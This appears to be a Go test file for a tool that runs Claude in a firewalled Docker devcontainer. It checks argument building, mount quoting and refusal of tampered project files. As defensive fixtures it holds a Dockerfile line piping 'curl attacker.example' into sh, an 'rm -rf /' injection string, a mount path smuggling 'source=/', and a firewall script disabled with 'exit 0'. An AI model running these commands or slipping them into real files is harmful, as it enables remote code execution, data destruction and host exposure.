package devcontainer

import (
	"bytes"
	"context"
	"encoding/csv"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"slices"
	"strings"
	"testing"
)

var target = Target{Dir: "/home/u/src/api", Project: "api", User: "dev"}

func TestArgv(t *testing.T) {
	cases := []struct {
		name string
		got  []string
		want []string
	}{
		{
			name: "build",
			got:  BuildArgv("docker", target),
			want: []string{"docker", "build", "--tag", "lyna-tmux-api", "--file", "/home/u/src/api/.devcontainer/Dockerfile", "/home/u/src/api/.devcontainer"},
		},
		{
			name: "state",
			got:  StateArgv("docker", target),
			want: []string{"docker", "container", "ls", "--all", "--filter", "name=^/lyna-tmux-api$", "--format", "{{.State}}"},
		},
		{
			name: "run",
			got:  RunArgv("/usr/local/bin/docker", target),
			want: []string{
				"/usr/local/bin/docker", "run", "--detach", "--init",
				"--name", "lyna-tmux-api",
				"--cap-add", "NET_ADMIN",
				"--security-opt", "no-new-privileges",
				"--user", "dev",
				"--mount", "type=bind,source=/home/u/src/api,target=/workspace",
				"--mount", "type=volume,source=lyna-tmux-claude-api,target=/home/dev/.claude",
				"--env", "CLAUDE_CONFIG_DIR=/home/dev/.claude",
				"--workdir", "/workspace",
				"lyna-tmux-api",
			},
		},
		{
			name: "run with a hostile directory",
			got:  RunArgv("docker", Target{Dir: `/tmp/a,readonly=false,source=/,"x`, Project: "api", User: "dev"})[12:14],
			want: []string{"--mount", `type=bind,"source=/tmp/a,readonly=false,source=/,""x",target=/workspace`},
		},
		{name: "start", got: StartArgv("docker", target), want: []string{"docker", "start", "lyna-tmux-api"}},
		{
			name: "firewall carries its own script and allowlist",
			got:  FirewallArgv("docker", target, []byte("api.anthropic.com\n")),
			want: []string{
				"docker", "exec", "--interactive", "--user", "root",
				"--env", "LYNA_TMUX_ALLOWLIST=api.anthropic.com\n",
				"lyna-tmux-api", "/bin/bash", "-s",
			},
		},
		{
			name: "shell",
			got:  ShellArgv("docker", target),
			want: []string{"docker", "exec", "--interactive", "--tty", "--user", "dev", "--workdir", "/workspace", "--env", "TERM", "--env", "COLORTERM", "--env", "LANG", "lyna-tmux-api", "bash", "-l"},
		},
		{
			name: "create passes arguments as argv",
			got:  CreateArgv("docker", target, []string{"create", "-l", "duo", "--", "--model", "opus; rm -rf /"}),
			want: []string{
				"docker", "exec", "--interactive", "--tty", "--user", "dev", "--workdir", "/workspace",
				"--env", "TERM", "--env", "COLORTERM", "--env", "LANG", "lyna-tmux-api",
				"lmux", "create", "-l", "duo", "--", "--model", "opus; rm -rf /",
			},
		},
		{name: "team subcommand", got: CreateArgv("docker", target, []string{"team", "--detach"})[15:], want: []string{"lmux", "team", "--detach"}},
		{name: "create without arguments", got: CreateArgv("docker", target, []string{"create"})[15:], want: []string{"lmux", "create"}},
		{
			name: "detached create has no terminal flags",
			got:  CreateDetachedArgv("docker", target, []string{"create", "--detach", "--", "--model", "opus; rm -rf /"}),
			want: []string{
				"docker", "exec", "--user", "dev", "--workdir", "/workspace",
				"--env", "TERM", "--env", "COLORTERM", "--env", "LANG", "lyna-tmux-api",
				"lmux", "create", "--detach", "--", "--model", "opus; rm -rf /",
			},
		},
		{name: "stop", got: StopArgv("docker", target), want: []string{"docker", "stop", "lyna-tmux-api"}},
		{name: "remove", got: RemoveArgv("docker", target), want: []string{"docker", "rm", "lyna-tmux-api"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if !slices.Equal(tc.got, tc.want) {
				t.Fatalf("argv\n got  %q\n want %q", tc.got, tc.want)
			}
		})
	}
}

func TestTargetNames(t *testing.T) {
	if target.Image() != "lyna-tmux-api" || target.Container() != "lyna-tmux-api" || target.Volume() != "lyna-tmux-claude-api" {
		t.Fatalf("names: %s %s %s", target.Image(), target.Container(), target.Volume())
	}
	// Container names are matched with an anchored regular expression; the
	// quoted name must match only itself.
	re := regexp.MustCompile("^/" + regexp.QuoteMeta(target.Container()) + "$")
	if !re.MatchString("/lyna-tmux-api") || re.MatchString("/lyna-tmux-api-2") || re.MatchString("/x-lyna-tmux-api") {
		t.Fatal("state filter matches other containers")
	}
}

func TestTargetValidate(t *testing.T) {
	cases := []struct {
		name    string
		target  Target
		wantErr string
	}{
		{"valid", target, ""},
		{"relative dir", Target{Dir: "src/api", Project: "api", User: "dev"}, "not absolute"},
		{"newline in dir", Target{Dir: "/src/a\nb", Project: "api", User: "dev"}, "control characters"},
		{"bad project", Target{Dir: "/src", Project: "Api", User: "dev"}, "invalid project"},
		{"root user", Target{Dir: "/src", Project: "api", User: "root"}, "invalid user"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.target.Validate()
			if tc.wantErr == "" && err != nil || tc.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tc.wantErr)) {
				t.Fatalf("Validate() = %v, want %q", err, tc.wantErr)
			}
		})
	}
}

func TestMountField(t *testing.T) {
	cases := []struct {
		value string
		want  string
	}{
		{"/home/u/src/api", "source=/home/u/src/api"},
		{"/home/u/My Projects/api", "source=/home/u/My Projects/api"},
		{"/tmp/a,b", `"source=/tmp/a,b"`},
		{`/tmp/q"uote`, `"source=/tmp/q""uote"`},
		{"/tmp/a=b", "source=/tmp/a=b"},
	}
	for _, tc := range cases {
		t.Run(tc.value, func(t *testing.T) {
			got := MountField("source", tc.value)
			if got != tc.want {
				t.Fatalf("MountField() = %q, want %q", got, tc.want)
			}
			assertMountRoundTrip(t, tc.value)
		})
	}
}

// assertMountRoundTrip parses a --mount value the way docker does (one CSV
// record) and checks the source survives unchanged with no injected keys.
func assertMountRoundTrip(t testing.TB, dir string) {
	t.Helper()
	value := "type=bind," + MountField("source", dir) + ",target=/workspace"
	r := csv.NewReader(strings.NewReader(value))
	r.LazyQuotes = false
	fields, err := r.Read()
	if err != nil {
		t.Fatalf("docker would reject %q: %v", value, err)
	}
	if len(fields) != 3 || fields[0] != "type=bind" || fields[1] != "source="+dir || fields[2] != "target=/workspace" {
		t.Fatalf("mount %q parsed as %q", value, fields)
	}
}

// recorder is a fake docker that answers the state query from a script of
// states and records every command.
type recorder struct {
	states []string
	fail   map[string]error // first two argv elements joined -> error
	calls  []Command
}

func (r *recorder) Run(_ context.Context, c Command) (string, error) {
	r.calls = append(r.calls, c)
	key := strings.Join(c.Argv[1:min(3, len(c.Argv))], " ")
	if err := r.fail[key]; err != nil {
		return "", err
	}
	if key == "container ls" {
		if len(r.states) == 0 {
			return "", errors.New("recorder: no state left")
		}
		s := r.states[0]
		r.states = r.states[1:]
		return s + "\n", nil
	}
	return "", nil
}

func (r *recorder) summary() []string {
	out := make([]string, 0, len(r.calls))
	for _, c := range r.calls {
		mode := "capture"
		if c.Interactive {
			mode = "attach"
		}
		out = append(out, mode+" "+strings.Join(c.Argv[1:min(3, len(c.Argv))], " "))
	}
	return out
}

// rendered returns a target whose project directory holds exactly the files
// Render produces for it, which is what Up insists on before it builds.
func rendered(t *testing.T) Target {
	t.Helper()
	tgt := Target{Dir: t.TempDir(), Project: target.Project, User: target.User}
	files, err := Render(Options{Project: tgt.Project, User: tgt.User, Source: release})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Write(tgt.Dir, files, false); err != nil {
		t.Fatal(err)
	}
	return tgt
}

// renderedStaged is rendered with a staged binary in place of the release.
func renderedStaged(t *testing.T) Target {
	t.Helper()
	binary := linuxBinary(runtime.GOARCH)
	tgt := Target{Dir: t.TempDir(), Project: target.Project, User: target.User}
	files, err := Render(Options{Project: tgt.Project, User: tgt.User, Source: Source{BinarySHA256: Digest(binary)}})
	if err != nil {
		t.Fatal(err)
	}
	files[FileBinary] = binary
	if _, err := Write(tgt.Dir, files, false); err != nil {
		t.Fatal(err)
	}
	return tgt
}

// tamper rewrites one rendered file of a project, the way a repository that
// ships its own .devcontainer would.
func tamper(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, filepath.FromSlash(name)), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestLifecycle(t *testing.T) {
	boom := errors.New("boom")
	cases := []struct {
		name string
		op   func(Docker, Target) error
		// project gives the case a real project directory. Up verifies the
		// rendered files before it builds anything, so every case that gets
		// past Validate needs one; the others keep the fixed target.
		project func(*testing.T) Target
		states  []string
		fail    map[string]error
		want    []string
		wantErr error
		// wantWrapped is a second error the failure must carry, for a step
		// whose failure is reported as one of its own.
		wantWrapped error
	}{
		{
			name:    "up creates a missing container",
			op:      func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: rendered,
			states:  []string{""},
			want:    []string{"attach build --tag", "capture container ls", "capture run --detach", "attach exec --interactive"},
		},
		{
			name:    "up starts an exited container",
			op:      func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: rendered,
			states:  []string{"exited"},
			want:    []string{"attach build --tag", "capture container ls", "capture start lyna-tmux-api", "attach exec --interactive"},
		},
		{
			name:    "up reapplies the firewall to a running container",
			op:      func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: rendered,
			states:  []string{"running"},
			want:    []string{"attach build --tag", "capture container ls", "attach exec --interactive"},
		},
		{
			name:        "up stops at a failed build",
			op:          func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project:     rendered,
			fail:        map[string]error{"build --tag": boom},
			want:        []string{"attach build --tag"},
			wantErr:     boom,
			wantWrapped: ErrBuildFailed,
		},
		{
			name:    "up stops at a failed state query",
			op:      func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: rendered,
			fail:    map[string]error{"container ls": boom},
			want:    []string{"attach build --tag", "capture container ls"},
			wantErr: boom,
		},
		{
			name:    "up stops at a failed run",
			op:      func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: rendered,
			states:  []string{""},
			fail:    map[string]error{"run --detach": boom},
			want:    []string{"attach build --tag", "capture container ls", "capture run --detach"},
			wantErr: boom,
		},
		{
			name:    "up reports a failed firewall",
			op:      func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: rendered,
			states:  []string{"running"},
			fail:    map[string]error{"exec --interactive": boom},
			want:    []string{"attach build --tag", "capture container ls", "attach exec --interactive"},
			wantErr: boom,
		},
		{
			name: "up refuses a Dockerfile the project rewrote",
			op:   func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := rendered(t)
				tamper(t, tgt.Dir, FileDockerfile, "FROM debian:13-slim\nRUN curl attacker.example | sh\n")
				return tgt
			},
			want:    nil,
			wantErr: ErrModified,
		},
		{
			name: "up refuses a firewall script the project rewrote",
			op:   func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := rendered(t)
				tamper(t, tgt.Dir, FileFirewall, "#!/bin/sh\nexit 0\n")
				return tgt
			},
			want:    nil,
			wantErr: ErrModified,
		},
		{
			name: "up refuses a widened allowlist",
			op:   func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := rendered(t)
				tamper(t, tgt.Dir, FileAllowedDomain, "attacker.example\n")
				return tgt
			},
			want:    nil,
			wantErr: ErrModified,
		},
		{
			name:    "up builds a project with a staged binary",
			op:      func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: renderedStaged,
			states:  []string{""},
			want:    []string{"attach build --tag", "capture container ls", "capture run --detach", "attach exec --interactive"},
		},
		{
			name: "up fails before docker when the staged binary is missing",
			op:   func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := renderedStaged(t)
				if err := os.Remove(filepath.Join(tgt.Dir, filepath.FromSlash(FileBinary))); err != nil {
					t.Fatal(err)
				}
				return tgt
			},
			want:    nil,
			wantErr: ErrBinaryMissing,
		},
		{
			name: "up refuses a swapped staged binary",
			op:   func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := renderedStaged(t)
				tamper(t, tgt.Dir, FileBinary, string(linuxBinary("amd64"))+"\n")
				return tgt
			},
			want:    nil,
			wantErr: ErrModified,
		},
		{
			name: "up refuses a Dockerfile that names no source",
			op:   func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := rendered(t)
				tamper(t, tgt.Dir, FileDockerfile, "FROM debian:13-slim\nRUN true\n")
				return tgt
			},
			want:    nil,
			wantErr: ErrModified,
		},
		{
			name: "shell fails before docker when the staged binary is missing",
			op:   func(d Docker, tg Target) error { return d.Shell(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := renderedStaged(t)
				if err := os.Remove(filepath.Join(tgt.Dir, filepath.FromSlash(FileBinary))); err != nil {
					t.Fatal(err)
				}
				return tgt
			},
			states:  []string{"running"},
			want:    nil,
			wantErr: ErrBinaryMissing,
		},
		{
			name: "up refuses a project without the rendered files",
			op:   func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: func(t *testing.T) Target {
				return Target{Dir: t.TempDir(), Project: target.Project, User: target.User}
			},
			want:    nil,
			wantErr: ErrMissing,
		},
		{
			name: "up refuses files rendered for other options",
			op:   func(d Docker, tg Target) error { return d.Up(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := rendered(t)
				files, err := Render(Options{Project: tgt.Project, User: tgt.User, Source: release, AllowedDomains: []string{"pkg.internal.example"}})
				if err != nil {
					t.Fatal(err)
				}
				if _, err := Write(tgt.Dir, files, true); err != nil {
					t.Fatal(err)
				}
				return tgt
			},
			want:    nil,
			wantErr: ErrModified,
		},
		{
			name:    "shell in a running container",
			op:      func(d Docker, tg Target) error { return d.Shell(t.Context(), tg) },
			project: rendered,
			states:  []string{"running"},
			want:    []string{"capture container ls", "attach exec --interactive"},
		},
		{
			name:    "shell refuses a stopped container",
			op:      func(d Docker, tg Target) error { return d.Shell(t.Context(), tg) },
			project: rendered,
			states:  []string{"exited"},
			want:    []string{"capture container ls"},
			wantErr: ErrNotRunning,
		},
		{
			name:    "create in a running container",
			op:      func(d Docker, tg Target) error { return d.Create(t.Context(), tg, []string{"-l", "duo"}) },
			project: rendered,
			states:  []string{"running"},
			want:    []string{"capture container ls", "attach exec --interactive"},
		},
		{
			name:    "create refuses a missing container",
			op:      func(d Docker, tg Target) error { return d.Create(t.Context(), tg, nil) },
			project: rendered,
			states:  []string{""},
			want:    []string{"capture container ls"},
			wantErr: ErrNotRunning,
		},
		{
			name:    "create reports a failed state query",
			op:      func(d Docker, tg Target) error { return d.Create(t.Context(), tg, nil) },
			project: rendered,
			fail:    map[string]error{"container ls": boom},
			want:    []string{"capture container ls"},
			wantErr: boom,
		},
		{
			name: "shell refuses a container whose files the project rewrote",
			op:   func(d Docker, tg Target) error { return d.Shell(t.Context(), tg) },
			project: func(t *testing.T) Target {
				tgt := rendered(t)
				tamper(t, tgt.Dir, FileFirewall, "#!/bin/sh\nexit 0\n")
				return tgt
			},
			states:  []string{"running"},
			want:    nil,
			wantErr: ErrModified,
		},
		{
			name: "create refuses a container whose files the project rewrote",
			op:   func(d Docker, tg Target) error { return d.Create(t.Context(), tg, nil) },
			project: func(t *testing.T) Target {
				tgt := rendered(t)
				tamper(t, tgt.Dir, FileDockerfile, "FROM debian:13-slim\n")
				return tgt
			},
			states:  []string{"running"},
			want:    nil,
			wantErr: ErrModified,
		},
		{
			name:   "down stops and removes a running container",
			op:     func(d Docker, tg Target) error { return d.Down(t.Context(), tg) },
			states: []string{"running"},
			want:   []string{"capture container ls", "capture stop lyna-tmux-api", "capture rm lyna-tmux-api"},
		},
		{
			name:   "down removes an exited container",
			op:     func(d Docker, tg Target) error { return d.Down(t.Context(), tg) },
			states: []string{"exited"},
			want:   []string{"capture container ls", "capture rm lyna-tmux-api"},
		},
		{
			name:   "down with no container is a no-op",
			op:     func(d Docker, tg Target) error { return d.Down(t.Context(), tg) },
			states: []string{""},
			want:   []string{"capture container ls"},
		},
		{
			name:    "down reports a failed stop",
			op:      func(d Docker, tg Target) error { return d.Down(t.Context(), tg) },
			states:  []string{"running"},
			fail:    map[string]error{"stop lyna-tmux-api": boom},
			want:    []string{"capture container ls", "capture stop lyna-tmux-api"},
			wantErr: boom,
		},
		{
			name:    "down reports a failed state query",
			op:      func(d Docker, tg Target) error { return d.Down(t.Context(), tg) },
			fail:    map[string]error{"container ls": boom},
			want:    []string{"capture container ls"},
			wantErr: boom,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tgt := target
			if tc.project != nil {
				tgt = tc.project(t)
			}
			rec := &recorder{states: tc.states, fail: tc.fail}
			err := tc.op(Docker{Exec: rec}, tgt)
			if tc.wantErr != nil && !errors.Is(err, tc.wantErr) {
				t.Fatalf("err = %v, want %v", err, tc.wantErr)
			}
			if tc.wantWrapped != nil && !errors.Is(err, tc.wantWrapped) {
				t.Fatalf("err = %v, want it to carry %v", err, tc.wantWrapped)
			}
			if tc.wantErr == nil && err != nil {
				t.Fatalf("unexpected error %v", err)
			}
			if got := rec.summary(); !slices.Equal(got, tc.want) {
				t.Fatalf("calls\n got  %q\n want %q", got, tc.want)
			}
			for _, c := range rec.calls {
				if c.Argv[0] != "docker" {
					t.Fatalf("default binary not used: %q", c.Argv)
				}
			}
		})
	}
}

func TestUpRejectsInvalidTarget(t *testing.T) {
	rec := &recorder{}
	cases := []struct {
		name string
		op   func(Docker) error
	}{
		{"up", func(d Docker) error { return d.Up(t.Context(), Target{Dir: "rel", Project: "api", User: "dev"}) }},
		{"up with an invalid user", func(d Docker) error {
			return d.Up(t.Context(), Target{Dir: t.TempDir(), Project: "api", User: "root"})
		}},
		{"state", func(d Docker) error {
			_, err := d.State(t.Context(), Target{Dir: "/x", Project: "api", User: "root"})
			return err
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := tc.op(Docker{Bin: "/opt/docker", Exec: rec}); err == nil {
				t.Fatal("invalid target accepted")
			}
			if len(rec.calls) != 0 {
				t.Fatalf("docker ran for an invalid target: %v", rec.summary())
			}
		})
	}
}

func TestDockerBinOverride(t *testing.T) {
	rec := &recorder{states: []string{"running"}}
	state, err := Docker{Bin: "/opt/docker", Exec: rec}.State(t.Context(), target)
	if err != nil || state != StateRunning || rec.calls[0].Argv[0] != "/opt/docker" {
		t.Fatalf("State() = %q, %v; calls %v", state, err, rec.summary())
	}
}

func TestExecutorFunc(t *testing.T) {
	var got Command
	f := ExecutorFunc(func(_ context.Context, c Command) (string, error) {
		got = c
		return "out", nil
	})
	out, err := f.Run(t.Context(), Command{Argv: []string{"docker", "ps"}, Interactive: true})
	if out != "out" || err != nil || !got.Interactive || got.Argv[1] != "ps" {
		t.Fatalf("ExecutorFunc.Run = %q, %v, %+v", out, err, got)
	}
}

func TestExec(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses POSIX shell scripts")
	}
	script := func(body string) string {
		path := filepath.Join(t.TempDir(), "docker")
		if err := os.WriteFile(path, []byte("#!/bin/sh\n"+body), 0o755); err != nil {
			t.Fatal(err)
		}
		return path
	}
	cases := []struct {
		name        string
		body        string
		args        []string
		interactive bool
		stdin       string
		wantOut     string
		wantStdout  string
		wantErr     string
	}{
		{name: "captured stdout", body: "echo running\necho noise >&2\n", args: []string{"container", "ls"}, wantOut: "running\n"},
		{name: "captured failure with stderr", body: "echo 'Error: No such container' >&2\nexit 1\n", args: []string{"rm", "x"}, wantErr: "rm: exit status 1: Error: No such container"},
		{name: "captured failure without stderr", body: "exit 2\n", wantErr: "exit status 2"},
		{name: "interactive streams", body: "read -r line\necho \"got $line\"\n", args: []string{"exec"}, interactive: true, stdin: "hello\n", wantStdout: "got hello\n"},
		{name: "interactive failure", body: "exit 5\n", args: []string{"exec"}, interactive: true, wantErr: "exit status 5"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var stdout, stderr bytes.Buffer
			e := Exec{Stdin: strings.NewReader(tc.stdin), Stdout: &stdout, Stderr: &stderr}
			out, err := e.Run(t.Context(), Command{Argv: append([]string{script(tc.body)}, tc.args...), Interactive: tc.interactive})
			if out != tc.wantOut || stdout.String() != tc.wantStdout {
				t.Fatalf("out = %q stdout = %q; want %q and %q", out, stdout.String(), tc.wantOut, tc.wantStdout)
			}
			if tc.wantErr == "" && err != nil || tc.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tc.wantErr)) {
				t.Fatalf("err = %v, want %q", err, tc.wantErr)
			}
		})
	}
	if _, err := (Exec{}).Run(t.Context(), Command{}); err == nil {
		t.Fatal("empty command accepted")
	}
}

func ExampleCreateArgv() {
	argv := CreateArgv("docker", Target{Dir: "/src/api", Project: "api", User: "dev"}, []string{"create", "-l", "trio"})
	fmt.Println(strings.Join(argv, " "))
	// Output: docker exec --interactive --tty --user dev --workdir /workspace --env TERM --env COLORTERM --env LANG lyna-tmux-api lmux create -l trio
}
